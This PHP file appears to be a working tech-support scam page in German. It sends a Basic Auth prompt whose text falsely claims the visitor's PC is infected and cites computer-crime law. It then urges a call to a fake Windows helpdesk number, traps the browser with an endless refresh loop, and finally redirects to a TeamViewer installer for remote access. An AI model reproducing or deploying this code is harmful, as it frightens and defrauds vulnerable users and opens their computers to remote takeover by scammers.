<?php

    session_start();

    $_user = 'windows2016d';
    $_password = 'microsoft1';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: security.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Aufgrund einer zerstörerischen Infektion in Ihrem PC sind einige verdächtige Aktivitäten auf Ihrer IP-Adresse gefunden. Rufen Sie jetzt gebührenfrei an, unter der Telefonnummer +4932221097517. Ihre Informationen sind einem echten Risiko ausgesetzt. Aufgrund einer schädlichen Infektion fehlt ein Computer-Framework-Datensatz. Öffnen Sie kein Webprogramm, um eine strategische Distanz zur Informationsentwertung in Ihrem Arbeitsframework einzuhalten. Zur Behebung des Problems, wenden Sie sich an Windows-Computerexperten unter der Telefonnummer +4932221097517
;  OSTEN. Ein DOS-Angriff könnte CFFA zerstören, 18 U.S.C 1030(a)(5)(A)(Wenn Sie absichtlich Netzwerk beschädigen, wird eine Haftstrafe von bis zu 10 Jahren gemäß den gesetzlichen Bestimmungen zur Computerkriminalität gegeben. Wenden Sie sich umgehend an der Windows-Abteilung, um die kostenlose Lösung zu finden +4932221097517."');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet-Sicherheit beschädigt !!! Rufen Sie den Helpdesk an</title></head><body>";


            exit;
        }
    } else {

        header('Location: security.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
